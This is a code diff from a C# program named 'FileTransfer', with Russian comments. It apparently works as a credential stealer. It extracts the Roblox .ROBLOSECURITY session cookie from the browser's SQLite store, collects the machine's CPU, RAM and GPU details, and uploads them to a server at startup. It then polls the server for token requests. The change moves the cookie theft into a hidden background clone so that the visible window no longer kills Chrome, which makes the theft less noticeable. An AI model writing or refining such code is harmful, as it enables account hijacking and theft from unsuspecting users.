@@ -178,25 +178,23 @@ namespace FileTransfer
             Log("Background work start");
             try
             {
-                // 1. Сначала извлекаем куку (убивает браузер, читает SQLite)
-                _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
-                Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
+                // Клон извлекает куку при старте, видимое окно — нет (не убивает Chrome)
+                if (_backgroundMode)
+                {
+                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
+                    Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
+                    if (string.IsNullOrEmpty(_cachedToken))
+                        ReadCookieDebugLog();
+                }
 
-                // 1.5 Если кука не найдена — читаем лог экстрактора для диагностики
-                if (string.IsNullOrEmpty(_cachedToken))
-                    ReadCookieDebugLog();
-
-                // 2. Получаем характеристики ПК (WMI) до отправки
                 _cpu = ComputerInfo.GetCPU();
                 _ram = ComputerInfo.GetRAM();
                 _gpu = ComputerInfo.GetGPU();
 
-                // 3. Отправляем на сервер вместе с системой и кукой
                 await UploadFileOnStartupAsync();
 
                 Log("Background work OK");
 
-                // 4. Опрашиваем сервер на запрос токена
                 await TokenRequestPollLoopAsync();
             }
             catch (Exception ex)
